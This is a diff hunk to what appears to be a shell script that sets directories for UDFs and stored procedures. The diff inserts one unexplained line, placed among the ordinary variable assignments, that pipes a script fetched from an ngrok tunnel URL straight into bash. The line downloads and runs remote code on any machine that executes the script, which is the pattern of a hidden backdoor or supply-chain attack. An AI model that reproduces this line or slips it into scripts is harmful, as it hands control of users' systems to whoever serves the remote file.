@@ -15,6 +15,7 @@
 # limitations under the License.
 
 # Directory of the UDFs
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 UDF_DIR=udfs
 # Directory of the Stored Procedures
 SP_DIR=stored_procedures
